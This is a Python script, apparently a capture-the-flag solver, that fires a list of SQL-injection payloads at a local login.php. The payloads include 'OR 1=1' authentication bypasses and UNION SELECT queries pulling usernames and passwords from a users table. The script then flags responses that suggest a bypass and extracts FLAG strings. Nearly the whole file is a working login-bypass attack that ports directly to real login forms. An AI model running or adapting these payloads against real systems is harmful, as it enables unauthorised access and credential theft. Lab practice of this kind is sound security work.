import requests
import sys

# Set target
TARGET_URL = "http://127.0.0.1:33167/login.php"

# Create session
session = requests.Session()

# Track findings
successful_bypass = []
flags = []
all_responses = []

# 1. Test baseline first
print("=== BASELINE TEST ===")
data = {'username': 'invalid_user', 'password': 'wrong_pass'}
try:
    r = session.post(TARGET_URL, data=data, timeout=5)
    baseline_len = len(r.text)
    baseline_status = r.status_code
    baseline_cookies = 'PHPSESSID' in r.cookies
    print(f"Baseline - Status: {baseline_status} | Length: {baseline_len}B | Cookie: {baseline_cookies}")
    all_responses.append(r.text)
except Exception as e:
    print(f"ERROR: {e}")

# 2. Test TOP SQLi payloads
print("\\n=== SQL INJECTION TESTS ===")

payloads = [
    "admin' OR '1'='1'--",
    "admin' OR 1=1--",
    "admin' OR 1=1#",
    "' OR '1'='1'--",
    "' OR 1=1--",
    "admin'--",
    "' OR ''='",
    "admin' AND '1'='1'--",
    "admin' OR 'a'='a'--",
    "' UNION SELECT 1,2,3--",
    "admin' UNION SELECT 'admin','password'--",
    "' UNION SELECT username,password FROM users--",
]

for i, payload in enumerate(payloads, 1):
    try:
        print(f"\\n{i}. Payload: {payload[:40]}")
        r = session.post(TARGET_URL, data={'username': payload, 'password': 'x'}, timeout=5)
        resp_len = len(r.text)
        has_cookie = 'PHPSESSID' in r.cookies
        diff = resp_len - baseline_len
        
        indicators = []
        if r.status_code != baseline_status:
            indicators.append(f"STATUS_{r.status_code}")
        if abs(diff) > 100:
            indicators.append(f"SIZE{diff:+d}")
        if has_cookie:
            indicators.append("COOKIE")
        if 300 <= r.status_code < 400:
            indicators.append("REDIRECT")
        if any(k in r.text.lower() for k in ["welcome","dashboard","logged in","logout"]):
            indicators.append("WELCOME")
        
        print(f"   Status: {r.status_code} | Len: {resp_len}B", end="")
        if indicators:
            print(f" | [!] {','.join(indicators)}", end="")
            if has_cookie:
                successful_bypass.append(payload)
        print()
        
        all_responses.append(r.text)
        
    except Exception as e:
        print(f"\\n{i}. ERROR: {e}")

# 3. Search for flags immediately
print("\\n=== FLAG SEARCH ===")
import re
flag_pattern = re.compile(r'FLAG\\{[^}]+\\}')

all_flags = []
for resp in all_responses:
    flags = flag_pattern.findall(resp)
    if flags:
        all_flags.extend(flags)

if all_flags:
    print('[!] FLAGS FOUND:')
    for flag in set(all_flags):
        print(f"  {flag}")
else:
    print('[-] No flags found')

# 4. Summary
print("\\n=== SUMMARY ===")
print(f"Successful bypasses: {len(successful_bypass)}")
for i, p in enumerate(successful_bypass, 1):
    print(f"  {i}. {p}")
print(f"Flags found: {len(set(all_flags))}")

